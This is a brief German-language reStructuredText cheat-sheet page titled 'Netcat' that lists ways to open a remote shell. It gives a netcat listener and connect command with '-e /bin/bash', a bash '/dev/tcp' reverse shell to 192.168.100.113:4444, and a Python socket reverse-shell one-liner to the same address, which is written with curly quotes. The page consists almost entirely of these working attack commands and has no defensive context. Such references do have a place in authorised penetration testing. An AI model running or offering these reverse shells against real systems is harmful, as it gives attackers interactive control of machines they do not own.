.. _nc_allg:

################
Netcat
################

Remote Shell
==============
Target Host: nc -lvp <port>
Source Host: 
* nc <target-ip> <port> -e /bin/bash

Alternativ via Bourne Shell auf dem target host:
Auf dem Target: bash -i >& /dev/tcp/192.168.100.113/4444 0>&1

Alternativ via Python auf dem target host:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.113”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);''

